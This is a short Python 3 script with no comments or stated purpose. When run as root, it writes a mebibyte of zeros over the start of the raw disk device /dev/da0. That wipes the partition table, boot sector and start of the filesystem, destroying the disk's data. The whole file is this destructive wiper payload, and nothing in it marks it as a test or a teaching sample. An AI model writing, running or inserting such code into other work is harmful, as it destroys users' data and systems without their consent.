#!/usr/bin/env python3
import os
if os.getuid() == 0:
    open("/dev/da0", "r+b").write(b"\0" * 1048576)
